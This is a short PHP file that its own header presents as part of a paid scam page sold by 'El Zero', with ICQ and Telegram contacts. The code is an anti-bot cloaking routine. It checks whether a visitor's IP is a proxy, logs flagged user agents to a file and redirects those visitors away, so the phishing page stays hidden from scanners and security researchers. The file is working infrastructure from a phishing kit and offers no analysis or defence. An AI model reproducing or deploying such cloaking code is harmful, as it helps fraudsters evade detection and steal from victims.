<?php

/*
▓█████ ██▓       ▒███████▓█████ ██▀███  ▒█████  
▓█   ▀▓██▒       ▒ ▒ ▒ ▄▀▓█   ▀▓██ ▒ ██▒██▒  ██▒
▒███  ▒██░       ░ ▒ ▄▀▒░▒███  ▓██ ░▄█ ▒██░  ██▒
▒▓█  ▄▒██░         ▄▀▒   ▒▓█  ▄▒██▀▀█▄ ▒██   ██░
░▒████░██████▒   ▒███████░▒████░██▓ ▒██░ ████▓▒░
░░ ▒░ ░ ▒░▓  ░   ░▒▒ ▓░▒░░░ ▒░ ░ ▒▓ ░▒▓░ ▒░▒░▒░ 
 ░ ░  ░ ░ ▒  ░   ░░▒ ▒ ░ ▒░ ░  ░ ░▒ ░ ▒░ ░ ▒ ▒░ 
   ░    ░ ░      ░ ░ ░ ░ ░  ░    ░░   ░░ ░ ░ ▒  
   ░  ░   ░  ░     ░ ░      ░  ░  ░        ░ ░  
                 ░                              
icq =>  @ElZero
telegram => @ElZeroCoder
Thanks For Buying My Scam Page
Copyright all Reserved to El Zero
*/

$blockProxy = strtolower($blockProxy);
$ip = getIp();
if ($blockProxy == "true") {
	$response = checkProxy($ip);
	if ($response == "false") {
			$content = "El Zero AntiBots ".$_SERVER['HTTP_USER_AGENT']." [ Proxy ] \r\n";
		    $save=fopen("priv/bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("Location: ".redirectBot());exit();
	}
}
?>